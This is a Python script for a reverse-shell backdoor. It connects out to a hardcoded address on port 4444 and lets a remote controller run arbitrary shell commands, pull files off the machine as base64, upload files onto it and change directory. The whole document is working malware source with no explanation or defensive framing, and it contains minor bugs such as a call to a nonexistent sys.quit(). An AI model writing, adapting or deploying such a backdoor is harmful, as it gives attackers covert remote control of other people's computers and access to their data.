#!/usr/bin/env python3



import subprocess,json

import socket,os,base64

import sys 



class Backdoor:

	def __init__(self,ip,port):

		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		while True:
			try:
				self.connection.connect((ip,port))
				break
			except:
				continue	

	def reliable_send(self,data):

		json_data = json.dumps(str(data))
		try:

			self.connection.send(bytes(json_data.encode()))
		except:
			sys.exit()

	def reliable_recv(self):

		json_data = b""

		while True:

			try:

				json_data = json_data + self.connection.recv(1024)

				return json.loads(json_data)

			except ValueError:

				continue



	def cd_command(self,path):

		os.chdir(path)

		return f"[+] Changing Directory to {path}"



	def read_file(self,path):

		with open(path,'rb') as f:

			return base64.b64encode(f.read())



	def write_file(self,path,content):

		content = content[2:-1:]

		content = base64.b64decode(content)

		

		with open(path,"wb") as f:

			f.write(content)

			return b"[+] Upload Successful"



	def execute_command(self,command):

		return subprocess.check_output(command,shell = True, stderr = subprocess.DEVNULL, stdin = subprocess.DEVNULL)



	def run(self):	

		while True:			

			try:

				command = self.reliable_recv()



				if command[0] == "exit":

					self.connection.close()

					sys.quit()

				elif command[0] == "upload":

					result = self.write_file(command[1],command[2])

					

				elif command[0] == "cd" and len(command) > 1:

					result = self.cd_command(command[1])

				elif command[0] == "download":

					result = self.read_file(command[1])

				else:

					result = self.execute_command(command)

				

			except:

				result = "[-] Error occured on client side..."

			self.reliable_send(result)







backdoor = Backdoor("192.168.0.196",4444)

backdoor.run()	